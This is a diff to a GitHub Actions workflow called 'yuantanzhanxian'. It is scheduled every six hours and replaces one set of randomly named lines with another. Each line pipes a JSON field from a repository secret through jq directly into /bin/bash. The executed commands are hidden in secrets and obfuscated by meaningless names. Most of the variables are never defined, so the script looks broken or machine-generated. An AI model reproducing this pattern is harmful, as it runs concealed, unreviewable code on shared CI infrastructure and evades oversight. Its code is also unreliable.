@@ -3,21 +3,24 @@ name: yuantanzhanxian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 1/6 * * *'
+    - cron: '5 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuantanzhanxian
         env:
-          ho92: ${{ secrets.ho92 }}
+          a4: ${{ secrets.a4 }}
         run: |
-          echo $ho92 | jq -r .v48946 | /bin/bash
-          echo $ijl31 | jq -r .jkdx7370 | /bin/bash
-          echo $ruftw65943 | jq -r .pjf31 | /bin/bash
-          echo $elkxg569 | jq -r .ncvd7537 | /bin/bash
-          echo $mj035 | jq -r .oa46575 | /bin/bash
-          echo $i605 | jq -r .ji69 | /bin/bash
-          echo $twkr09058 | jq -r .c96145 | /bin/bash
+          echo $a4 | jq -r .agtbc2253 | /bin/bash
+          echo $spje03374 | jq -r .fldt654 | /bin/bash
+          echo $ky65888 | jq -r .gkjxe0182 | /bin/bash
+          echo $ioyjn96 | jq -r .b78 | /bin/bash
+          echo $nqysf8 | jq -r .zqcov620 | /bin/bash
+          echo $cl074 | jq -r .ox3 | /bin/bash
+          echo $lzkh9 | jq -r .olka7899 | /bin/bash
+          echo $vfp2000 | jq -r .prh8133 | /bin/bash
 
